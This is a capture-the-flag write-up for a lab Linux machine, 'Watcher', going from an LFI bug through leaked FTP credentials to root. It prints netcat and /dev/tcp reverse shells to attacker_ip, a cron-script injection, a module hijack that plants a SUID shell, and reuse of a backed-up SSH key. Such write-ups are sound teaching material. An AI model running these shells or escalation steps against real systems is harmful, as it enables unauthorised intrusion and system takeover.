
<img width="150" height="150" alt="image" src="https://github.com/user-attachments/assets/e8cfc820-e131-497c-ba5c-958901be6b08" />


# Watcher | WriteUp
A boot2root Linux machine utilising web exploits along with some common privilege escalation techniques.

# 1. Reconnaissance

A full port scan revealed three exposed services:

- **FTP (21):** vsftpd 3.0.5  
- **SSH (22):** OpenSSH 8.2p1 (Ubuntu)  
- **HTTP (80):** Apache 2.4.41 (Jekyll-based site)

No immediate anonymous FTP access was available.

---

# 2. Web Application Exploitation (LFI)

## Initial Discovery

The web application had a Local File Inclusion vulnerability in the `post` parameter:

```

http://target_ip/post.php?post=../../../../../../../../etc/hosts

```

This confirmed arbitrary file read access on the system.

---

## Sensitive File Access

Using the LFI vulnerability, multiple important files were accessed:

- `/etc/hosts`
- `.htaccess`
- `flag_1.txt`

---

## Hidden File Disclosure

Inside `.htaccess`, a hidden rule was found:

```

RedirectMatch 403 /[REDACTED].txt

```

Bypassing this restriction allowed access to a hidden file:

```

http://target_ip/post.php?post=[REDACTED].txt

````

This file leaked **FTP credentials**.

---

# 3. FTP Access

Using the leaked credentials, access to FTP was successful.

From FTP, the second flag was retrieved:

- `flag_2.txt`

However, directory contents were minimal and no further escalation was possible here.

---

# 4. LFI to Remote Code Execution (RCE)

## Exploitation Method

The LFI vulnerability was escalated into RCE using a known technique (LFI-to-RCE via payload injection).

A reverse shell payload was executed:

```bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc attacker_ip 4444 > /tmp/f
````

---

## Listener Setup

On the attacker machine:

```
nc -lvp 4444
```

This resulted in a shell as:

```
www-data@target_ip
```

---

# 5. Initial Foothold (www-data)

After gaining access:

* A hidden directory was discovered:

```
/var/www/html/more_secrets_a9f10a/
```

* Inside it:

```
flag_3.txt (REDACTED)
```

---

# 6. Enumeration

## System Users

The system contained multiple users:

* ftpuser
* mat
* toby
* ubuntu
* will

---

## Privilege Check

```
sudo -l
```

Result:

```
www-data can run ALL commands as user toby without password
```

---

# 7. Privilege Escalation (www-data → toby)

A simple escalation was performed:

```
sudo -u toby /bin/bash
```

This granted access as **toby**.

Flag obtained:

* `flag_4.txt`

---

# 8. Lateral Movement via Cron Job

A cron job was discovered:

```
*/1 * * * * mat /home/toby/jobs/cow.sh
```

This script was writable and executed frequently.

---

## Reverse Shell Injection

The script was modified:

```bash
/bin/bash -i >& /dev/tcp/attacker_ip/1234 0>&1
```

---

## New Shell

Listener:

```
nc -lvp 1234
```

Result:

```
mat@target_ip
```

Shell upgraded using:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

# 9. User mat → will Privilege Escalation

## Sudo Permissions

```
mat can run:
(will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

---

## Exploitation Strategy

The Python script imported a local module (`cmd.py`), which was writable.

By modifying it, arbitrary system commands were executed under `will`.

Payload:

```python
import os

def get_command(num):
    os.system('cp /bin/bash /tmp/bash && chmod +s /tmp/bash')
```

---

## Execution

```
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
```

---

## Result

A SUID shell was created:

```
/tmp/bash -p
```

Now running as:

```
will
```

---

# 10. User will Access

Flag retrieved:

* `flag_6.txt`

---

## Privilege Escalation Path Discovery

A sensitive file was found:

```
/opt/backups/key.b64
```

Decoded into an SSH private key:

```
base64 -d key.b64 > /tmp/id_rsa
chmod 600 id_rsa
```

---

## Root Access

SSH into localhost:

```
ssh -i id_rsa root@127.0.0.1
```

---

# 11. Root Access

Final access achieved:

```
root@target_ip
```

Final flag:

* `/root/flag_7.txt (REDACTED)`

